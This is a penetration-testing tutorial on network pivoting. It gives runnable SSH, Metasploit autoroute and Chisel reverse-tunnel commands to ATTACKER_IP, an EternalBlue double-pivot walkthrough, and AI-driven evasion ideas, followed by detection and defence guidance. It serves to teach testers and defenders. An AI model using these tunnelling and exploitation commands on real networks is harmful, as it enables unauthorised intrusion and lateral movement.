What is Pivoting?

Pivoting is the technique of routing network traffic through a compromised host to reach network segments that are not directly accessible from the attacker's position. It is one of the core capabilities that separates superficial penetration tests — which only assess the internet-facing perimeter — from comprehensive internal assessments that evaluate the full blast radius of an initial compromise.

In the real world, an attacker who compromises a single internet-facing web server does not stop there. That server is connected to internal networks — databases, domain controllers, file servers, workstations — that are unreachable from the internet but reachable from the compromised host. Pivoting transforms that one foothold into a bridge into the entire internal network. Understanding this technique is essential for penetration testers who need to demonstrate true business risk, and for defenders who need to understand what a real attacker can do after initial compromise.

[ ⚠ ]

Authorised Use Only. All pivoting techniques in this guide must be conducted exclusively on systems you own or have explicit written authorisation to test. Pivoting on unauthorised networks is illegal under the Computer Misuse Act and equivalent legislation globally. Always stay strictly within the defined scope of your engagement.

Types of Pivoting

Pivoting manifests across multiple layers of the network stack — from raw TCP/UDP tunnelling at the network level through to application-layer proxy pivots that leverage trusted browser sessions. The choice of pivot type depends on the access level achieved on the foothold, the network controls in place (firewall rules, DPI, egress filtering), and which internal targets need to be reached. Understanding all types enables selecting the most reliable and stealthy approach for each specific engagement scenario.

01
Network-Level Pivoting
Routes raw network packets through the compromised host at the IP/TCP layer. The attacker's machine effectively has a network-level path to the internal subnet via the pivot. SSH dynamic forwarding, Chisel SOCKS proxies, and Metasploit autoroute all operate at this level. The most versatile pivot type — allows any protocol to traverse the pivot, not just HTTP/HTTPS.
MOST COMMON
02
Application-Level Pivoting
Leverages application sessions already established on the compromised host rather than creating a new network tunnel. Browser pivoting in Metasploit injects into an existing browser process and routes requests through its authenticated sessions — bypassing network-level controls by appearing as legitimate user traffic. Highly effective but limited to web-accessible targets.
STEALTHY
03
Reverse Pivoting
The compromised internal host initiates the connection outbound to the attacker rather than the attacker connecting inward. Critical when inbound connections to the internal network are blocked by the firewall. Chisel's reverse SOCKS mode is the primary tool — the internal host calls out to the attacker's Chisel server on an allowed port (443, 80, 8080), establishing a reverse tunnel.
FIREWALL BYPASS
04
VPN-Based Pivoting
Uses extracted or captured VPN credentials to join the target's VPN as a legitimate remote user, gaining full network access to internal resources. When VPN credentials are obtained (from credential dumping, password spraying, or breach data), this pivot type provides the most complete and natural-looking internal network access — indistinguishable from a legitimate remote worker connection.
HIGH IMPACT

Pivoting Techniques — Complete Reference

Each pivoting technique has distinct characteristics — some require SSH access to the pivot host, some require only a shell, some work entirely from memory without touching disk. Selecting the right technique for a given engagement depends on the access level, available tools, firewall rules, and detection risk. The commands below assume an authorised penetration test in a lab or client-approved engagement environment.

⟩ SSH Tunnelling — Local, Remote & Dynamic
SSH is the most reliable and universally available pivot mechanism when SSH access to the pivot host is available. Three modes address different scenarios: local forwarding maps a specific internal service to a local port; remote forwarding exposes the attacker's services to the internal network; and dynamic forwarding creates a full SOCKS5 proxy that tunnels any TCP traffic through the SSH connection.
# LOCAL PORT FORWARDING — access a specific internal service # Maps internal_host:TARGET_PORT to localhost:LOCAL_PORT via pivot_host # Example: access RDP on an internal Windows server at 192.168.1.50 ssh -L 13389:192.168.1.50:3389 user@pivot_host # Then: xfreerdp /u:Administrator /v:localhost:13389 # REMOTE PORT FORWARDING — expose attacker service to internal network # Useful to deliver payloads or catch reverse shells from internal hosts ssh -R 4444:localhost:4444 user@pivot_host # Internal hosts can now connect to pivot_host:4444 → your listener # DYNAMIC PORT FORWARDING — full SOCKS5 proxy through the pivot # Creates SOCKS5 on local port 9050 — route ALL traffic through SSH ssh -D 9050 -N -f user@pivot_host # -N: no command, -f: background daemon mode # Use proxychains to route any tool through the SOCKS5 proxy proxychains nmap -sT -Pn -p 22,80,443,3389,445 192.168.1.0/24 proxychains curl http://192.168.1.100/admin proxychains crackmapexec smb 192.168.1.0/24 # SSH MULTI-HOP — jump through multiple hosts in a single command ssh -J user@pivot1,user@pivot2 user@final_target # Traffic path: Attacker → pivot1 → pivot2 → final_target
⟩ Metasploit Autoroute & SOCKS Proxy
Metasploit's autoroute module adds routes to internal subnets through an active Meterpreter session, allowing all subsequent MSF modules to reach those subnets directly. Combined with the auxiliary/server/socks_proxy module, this creates a SOCKS proxy endpoint that external tools (proxychains, browser) can use to traverse the pivot — all without requiring SSH access to the compromised host.
# Step 1: After obtaining a Meterpreter session, background it background # or Ctrl+Z # Step 2: Add route to internal subnet through session 1 use post/multi/manage/autoroute set SESSION 1 set SUBNET 192.168.1.0/24 # Internal subnet discovered on pivot host run # Alternatively: route add 192.168.1.0/24 1 # Confirm routes are set route print # Step 3: Start SOCKS proxy — listens on localhost:1080 use auxiliary/server/socks_proxy set VERSION 5 set SRVPORT 1080 set SRVHOST 127.0.0.1 run -j # Run as background job # Step 4: Configure /etc/proxychains4.conf # socks5 127.0.0.1 1080 # Then scan internal network with any tool via proxychains proxychains nmap -sT -Pn 192.168.1.0/24
⟩ Chisel — Fast TCP/UDP Reverse Tunnelling
Chisel is a fast TCP/UDP tunnelling tool that operates over HTTP, making it highly effective at bypassing firewalls that block non-standard outbound connections. Its reverse SOCKS mode is particularly valuable in environments where only outbound HTTP/HTTPS is permitted — the internal host connects outward to the attacker's Chisel server on port 443 (HTTPS), establishing a full SOCKS5 proxy back through the firewall. No SSH daemon required on the pivot host.
# ATTACKER MACHINE — start Chisel server in reverse mode # --reverse: accept reverse tunnel connections from clients # --port: listening port (use 443 to blend with HTTPS traffic) ./chisel server --reverse --port 443 # PIVOT HOST (compromised machine — upload chisel binary or run in memory) ./chisel client ATTACKER_IP:443 R:1080:socks # R:1080:socks = create reverse SOCKS5 proxy on attacker port 1080 # Traffic: Attacker tools → SOCKS 1080 → Chisel → Pivot host → Internal network # Now use proxychains on attacker with SOCKS5 127.0.0.1:1080 proxychains nmap -sT -Pn -p 80,443,22,3389,445,1433 10.10.10.0/24 # SPECIFIC PORT FORWARDING with Chisel (access single internal service) ./chisel client ATTACKER_IP:443 R:13389:192.168.1.50:3389 # Attacker can now RDP to localhost:13389 → reaches internal host 192.168.1.50:3389 # Run Chisel in memory (no file on disk — reduced forensic footprint) # Load via Meterpreter execute -m or PowerShell download-and-execute

Double Pivoting — Chaining Multiple Hops

Double pivoting extends the single pivot concept to chain through two or more compromised hosts, reaching deeply segmented network zones that are inaccessible even from the first pivot. This technique is used when organisations implement tiered network segmentation — the DMZ can reach the internal network, but not the secure zone; the internal network can reach the secure zone, but not directly from outside. By compromising hosts at each level, the attacker can traverse all boundaries.

Double pivoting is significantly harder to detect than single pivoting — the traffic at each hop appears to originate from a trusted internal host, and the connection chain makes attribution and real-time detection more challenging. However, it also increases operational complexity and the risk of the chain breaking if any intermediate host is patched or restarted.

Double Pivot Architecture — Three-Hop Scenario
HostRoleNetwork PositionAccess From
AttackerOriginInternetDirect internet connection
Machine AFirst Pivot (Foothold)DMZ — internet-facingDirectly exploited from internet
Machine BSecond PivotInternal network — reachable from DMZVia pivot through Machine A
Machine CFinal TargetSecure zone — only reachable from internalVia double pivot through A→B
⟩ Metasploit Double Pivot — Two Autoroutes
Metasploit supports multi-level pivoting by chaining autoroute entries through multiple sessions. Once Machine A is compromised and a session is established, a route to Machine B's subnet is added. Machine B is then exploited through the first pivot — its Meterpreter session is now also available in MSF. A second route is added through Machine B's session to Machine C's subnet, completing the double pivot chain.
# STEP 1: Initial compromise of Machine A (internet-facing) # Session 1 is now active on Machine A # STEP 2: Add route to Machine B's subnet through Session 1 route add 192.168.1.0/24 1 # 192.168.1.0/24 = Machine B's network # STEP 3: Scan Machine B through the first pivot use auxiliary/scanner/portscan/tcp set RHOSTS 192.168.1.50 # Machine B's IP set PORTS 22,80,443,445,3389 run # STEP 4: Exploit Machine B through the first pivot # (Traffic routes automatically through Session 1 / Machine A) use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 192.168.1.50 set PAYLOAD windows/x64/meterpreter/bind_tcp # BIND payload — no direct reverse path yet run # Session 2 now active on Machine B via pivot through Machine A # STEP 5: Add route to Machine C's subnet through Session 2 route add 10.10.10.0/24 2 # 10.10.10.0/24 = Machine C's secure network # STEP 6: Machine C is now reachable through the double pivot chain # Attacker → Machine A (Session 1) → Machine B (Session 2) → Machine C use auxiliary/scanner/portscan/tcp set RHOSTS 10.10.10.100 # Machine C run
⟩ Chisel Double Pivot — Nested SOCKS Tunnels
Chisel enables double pivoting by chaining two reverse SOCKS tunnels. The first Chisel tunnel runs from Machine A back to the attacker. The second Chisel tunnel runs from Machine B through Machine A's Chisel server back to the attacker — creating a nested tunnel where traffic from the attacker traverses both hops before reaching Machine C's network. This approach works without Metasploit and leaves a smaller footprint.
# ATTACKER MACHINE — start Chisel server ./chisel server --reverse --port 443 # MACHINE A (first pivot — internet-facing) # Connect back to attacker, expose SOCKS5 on attacker port 1080 # AND start a local Chisel server for Machine B to connect to ./chisel client ATTACKER_IP:443 R:1080:socks # First SOCKS proxy ./chisel server --reverse --port 8000 # Local listener for Machine B # MACHINE B (second pivot — internal, only reachable via Machine A) # Connect to Machine A's local Chisel server at port 8000 # Expose SOCKS5 on attacker port 2080 (second hop) ./chisel client 192.168.1.10:8000 R:2080:socks # Second SOCKS proxy # (192.168.1.10 = Machine A's internal IP reachable from Machine B) # ATTACKER — now has TWO SOCKS proxies: # Port 1080 = SOCKS through Machine A (reach Machine B's network) # Port 2080 = SOCKS through Machine A → Machine B (reach Machine C's network) # Configure proxychains for double hop: # /etc/proxychains4.conf: # socks5 127.0.0.1 1080 ← first hop (through Machine A) # socks5 127.0.0.1 2080 ← second hop (through A → B) proxychains nmap -sT -Pn 10.10.10.100 # Reaches Machine C via double pivot

Pivoting Toolset Reference

Chisel
TCP/UDP · Reverse · HTTP
Fast reverse proxy written in Go — TCP/UDP tunnelling over HTTP. Reverse SOCKS mode bypasses restrictive egress firewalls. No SSH required. Runs as a single binary on both attacker and target
SSH (OpenSSH)
Local · Remote · Dynamic
Native Unix/Linux tool — local, remote, and dynamic (SOCKS5) port forwarding. Multi-hop via -J flag. Pre-installed on virtually every Linux/Unix system. Best tool when SSH access is available
Metasploit Autoroute
MSF · Multi-Route
Native MSF module — adds routes to internal subnets through Meterpreter sessions. Supports multi-session (double/triple pivot) routing. Integrates seamlessly with all MSF auxiliary and exploit modules
ligolo-ng
Layer 3 · TUN Interface
Creates a real TUN/TAP interface on the attacker machine — tunnelled traffic goes through the pivot. Every tool works natively without proxychains configuration. Best for complex multi-subnet engagements
proxychains
SOCKS · Tool Wrapper
Wraps any dynamically-linked tool to route its connections through a SOCKS4/5 proxy. Essential companion to SSH dynamic forwarding, Chisel, and MSF SOCKS proxy. Configurable chain of multiple proxies
sshuttle
Transparent VPN
Creates a transparent VPN over SSH — routes entire subnet traffic through the SSH pivot without requiring proxychains configuration on every tool. Works on Linux/macOS attacker machines
plink (Windows)
Windows · SSH Client
PuTTY's command-line SSH client for Windows pivot hosts — enables SSH tunnelling from Windows systems that don't have native OpenSSH access. Useful for pivoting from compromised Windows machines
rpivot
SOCKS4 · Reverse
Python-based reverse SOCKS4 proxy — attacker runs server, pivot host runs client. Lightweight, works through HTTP proxies, useful in corporate environments with authenticated web proxies

AI Integration in Pivoting & Lateral Movement

Artificial Intelligence is changing the landscape of network pivoting from both the offensive and defensive perspectives. For penetration testers, AI tools are transforming the most time-intensive aspects of pivot-based engagements: building the network topology model from discovered data, identifying the optimal multi-hop path to high-value targets, generating pivot configurations for specific network architectures, and detecting when current pivot traffic patterns are likely to trigger alerts so timing can be adjusted.

On the defensive side, AI-powered network detection tools are making pivot traffic progressively harder to hide. ML models trained on normal east-west traffic patterns instantly flag the anomalous communication relationships, unusual port forwarding, and encrypted tunnel behaviours that pivoting creates — making AI-driven detection the primary challenge for modern red teams operating in mature security environments.

[ AI ]

Graph neural networks can process the full set of discovered hosts, network routes, and vulnerability data from an internal assessment and automatically identify the optimal pivot chain to reach the highest-value target — minimising the number of hops, the detection risk at each hop, and the time to achieve the engagement objective. This capability is now available in commercial red team platforms and experimental autonomous pen testing tools.

AI-Powered Offensive Pivoting Capabilities

🗺
AI Attack Path Optimisation
Graph-based AI models process discovered network topology data — reachable subnets, open services, vulnerability scan results, and credential access — to automatically identify the shortest, lowest-detection multi-hop path from the attacker's starting position to the engagement's target objective. Replaces manual pivot chain planning with AI-generated step sequences ranked by success probability and detection risk.
🔧
Automated Pivot Configuration
LLMs generate complete, ready-to-execute pivot configuration commands for specific network architectures — SSH tunnelling chains, Chisel reverse proxies, and proxychains configurations — tailored to the specific OS, firewall rules, and available tools on each discovered host. Eliminates time spent on manual command construction and reduces errors in complex multi-hop setups.
⏱
Detection-Aware Timing
AI models analyse the defender's observed detection patterns — response times to previous probes, business hours of activity, known alert thresholds — and recommend optimal timing windows for pivot establishment and internal scanning. Reduces detection probability by operating during periods of low analyst attention or high legitimate traffic volume that provides cover.
🔄
Autonomous Pivot Management
AI agent frameworks autonomously maintain and repair pivot chains during long-running engagements — detecting broken tunnels, re-establishing connectivity through alternative paths, rotating pivot hosts when one becomes unavailable, and adjusting routing tables to reflect network changes discovered during the engagement without requiring manual intervention.
🎭
Traffic Blending & Evasion
AI analyses the target network's normal traffic patterns — protocols in use, communication timing, data volumes, typical connection pairs — and generates pivot configurations that blend tunnelled traffic with legitimate network activity. Schedules pivot traffic to match business-hours patterns, mimics protocol signatures of approved applications, and fragments traffic to avoid volume-based detection.
📊
Automated Pivot Documentation
LLMs automatically generate engagement documentation for discovered pivot paths — creating clear network diagrams, command sequences, screenshots annotations, and risk narratives for each hop in the chain. Produces penetration test finding entries for IT-OT network gaps, inadequate network segmentation, and missing egress controls discovered via successful pivot establishment.

AI-Powered Pivot Detection & Defence

👁
Encrypted Tunnel Detection
ML models analyse network flow metadata — connection timing regularity, packet size distributions, connection persistence anomalies, and protocol fingerprints — to detect encrypted tunnels (Chisel over HTTPS, SSH SOCKS proxies) that are invisible to DPI but produce distinctive traffic patterns. Detects C2 and pivot tunnels even when the payload content is fully encrypted.
🕸
Anomalous Connection Relationship Detection
AI baselines the normal east-west communication graph of the internal network — which hosts communicate with which, on which ports, at what frequency. A compromised pivot host suddenly communicating with internal IP ranges it has never previously accessed, or forwarding connections on behalf of other hosts, produces an anomalous graph signature that ML detects in real time.
🔍
Lateral Movement Sequence Detection
ML models trained on APT and red team lateral movement sequences recognise the characteristic patterns of pivot-based attacks — a host scanning a subnet it's never scanned, then connecting to newly discovered hosts, then those hosts connecting back — as a temporally correlated attack sequence rather than individual unrelated events, enabling earlier-stage detection.
🛡
AI-Driven Micro-Segmentation
AI network security platforms (Illumio, Guardicore) continuously analyse actual communication flows and recommend or enforce micro-segmentation policies — automatically blocking connections that are anomalous relative to the learned baseline and have no documented business justification. Prevents pivot lateral movement by denying the network reachability that pivoting requires.
🚨
Real-Time Pivot Disruption
AI-driven SOAR platforms respond automatically to confirmed pivot indicators — immediately blocking the suspicious outbound connection at the firewall, isolating the potentially compromised host at the network switch level, terminating suspicious processes via EDR, and alerting the SOC with a pre-built attack timeline — collapsing the pivot chain within seconds of detection.
🔮
Network Segmentation Gap Prediction
AI analyses existing network access control rules and communication flow data to predict which hosts represent the most likely pivot points in a potential attack — identifying dual-homed hosts, misconfigured firewall rules that allow unexpected cross-segment traffic, and trust relationships that would make a specific host valuable as a pivot target. Enables proactive hardening before the next pen test finds the same paths.

Defence — Detecting & Preventing Pivoting

Defending against pivoting requires addressing both the preconditions (initial compromise that creates the foothold) and the pivot mechanism itself (the network controls that allow traversal). No single control is sufficient — an attacker who controls a host inside the network can pivot through any protocol that is permitted between network segments. Effective defence requires layered controls that make each pivot hop progressively harder to establish and easier to detect.

Network Micro-Segmentation
Implement fine-grained network access controls between every segment — not just between DMZ and internal, but between every internal subnet and every host class. Workstations should not communicate with each other directly. Servers should only accept connections from explicitly authorised sources. Zero-trust network architecture makes each pivot hop require a separate exploitable misconfiguration rather than a single border crossing.
Egress Filtering
Block all outbound connections from internal systems that are not explicitly required for business function. Chisel, reverse SSH tunnels, and DNS/HTTP C2 all require outbound connectivity from the pivot host. If an internal application server has no business reason to initiate outbound HTTPS connections to the internet, blocking that traffic kills the most common reverse pivot technique before it is established.
Deep Packet Inspection
Deploy next-generation firewalls with application-layer inspection that can identify tunnelled protocols — SSH over HTTPS (Chisel), HTTP CONNECT proxies, and non-standard protocol use. DPI identifies traffic that appears to be HTTPS but has the timing and size characteristics of interactive tunnel sessions rather than web browsing, flagging it for investigation regardless of encryption.
East-West Traffic Monitoring
Deploy network detection and response (NDR) tools that monitor lateral (east-west) traffic between internal hosts — not just north-south traffic crossing the perimeter. AI-powered NDR platforms (Darktrace, Vectra, ExtraHop) baseline normal internal communication patterns and detect the anomalous connection relationships that pivoting creates within minutes of establishment.
Host-Based Controls
Enable Windows Firewall on all internal hosts with default-deny inbound rules — preventing the direct host-to-host connections that lateral movement requires even after network-level segmentation is bypassed. Deploy EDR on all hosts to detect proxychains execution, SSH tunnel establishment, Chisel process creation, and other pivot tooling at the process level regardless of network-layer evasion.
Privileged Access Management
Implement PAM solutions that restrict which accounts can authenticate to which hosts — preventing the credential-based lateral movement that follows successful pivot establishment. Service accounts should be locked to specific source hosts. Admin credentials should only work from dedicated privileged access workstations. This limits what an attacker can do even after successfully routing traffic through a pivot chain.
Detection Checklist
  • Alert on new outbound connections on port 443 from servers that historically had no outbound HTTPS activity
  • Alert on SSH connections between internal hosts unless explicitly whitelisted for management purposes
  • Monitor for proxychains binary execution or equivalent in EDR telemetry
  • Alert on SOCKS proxy listener creation on non-standard ports via Sysmon process monitoring
Network Controls
  • Implement Zero Trust Network Access (ZTNA) — every connection verified regardless of source network
  • Deploy network access control (NAC) — authenticate devices before allowing any internal network access
  • Block ICMP, raw sockets, and unexpected protocols between network segments at the firewall
  • Implement DNS monitoring — DNS tunnelling is a common fallback when TCP pivots are blocked
AI-Enhanced Detection
  • Deploy AI-powered NDR (Darktrace/Vectra) to baseline east-west traffic and detect anomalous pivot communication patterns
  • Enable ML tunnel detection on NGFW — identify encrypted pivot tunnels by traffic pattern rather than payload content
  • Use AI threat hunting to proactively query endpoint telemetry for pivot tooling artefacts and unusual network connections
  • Implement AI-driven SOAR playbooks that automatically isolate hosts and terminate suspicious tunnel connections on detection
